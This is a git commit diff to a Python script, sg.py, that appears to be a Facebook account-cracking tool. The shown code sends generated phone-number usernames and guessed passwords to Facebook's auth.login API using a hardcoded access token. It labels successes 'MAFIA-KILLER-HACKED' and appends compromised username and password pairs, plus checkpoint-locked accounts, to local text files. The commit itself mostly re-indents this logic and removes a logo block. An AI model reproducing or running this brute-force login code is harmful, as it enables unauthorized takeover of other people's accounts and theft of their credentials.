22e7717ae5e163a2a558fcafac56e682ce5e9ba7
sHuBhAm_G0sAiN <63947251+ShuBhamg0sain@users.noreply.github.com>
2020-10-30 21:00:46 +0530

    Update sg.py

--- sg.py
+++ sg.py
@@ -47,9 +47,7 @@ def t():
     time.sleep(1)
 def cb():
     os.system('clear')
-##### Dev : Shubhamg0sain#####
-##### LOGO #####
-                                '''
+##### Dev : Shubhamg0sain####
 
 back = 0
 successful = []
@@ -170,18 +168,18 @@ def action():
                                                         data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                                         q = json.load(data)
                                                         if 'access_token' in q:
-                                                          print '\x1b[1;91mMAFIA-KILLER-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass3
-                                                          okb = open('save/successfull.txt', 'a')
-                                                          okb.write(k+c+user+'|'+pass3+'\n')
-                                                          okb.close()
-                                                          oks.append(c+user+pass3)
+                                                                print '\x1b[1;91mMAFIA-KILLER-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass3
+                                                                okb = open('save/successfull.txt', 'a')
+                                                                okb.write(k+c+user+'|'+pass3+'\n')
+                                                                okb.close()
+                                                                oks.append(c+user+pass3)
                                                         else:
-                                                          if 'www.facebook.com' in q['error_msg']:
-                                                          print '\x1b[1;92mOPEN AFTER(7DAYS)🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass3
-                                                          cps = open('save/checkpoint.txt', 'a')
-                                                          cps.write(k+c+user+'|'+pass3+'\n')
-                                                          cps.close()
-                                                          cpb.append(c+user+pass3)
+                                                                if 'www.facebook.com' in q['error_msg']:
+                                                                        print '\x1b[1;92mOPEN AFTER(7DAYS)🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass3
+                                                                        cps = open('save/checkpoint.txt', 'a')
+                                                                        cps.write(k+c+user+'|'+pass3+'\n')
+                                                                        cps.close()
+                                                                        cpb.append(c+user+pass3)
 
 
                 except:
@@ -198,11 +196,3 @@ def action():
 
 if __name__ == '__main__':
         menu()
-
-
-
-
-
-
-
->>>
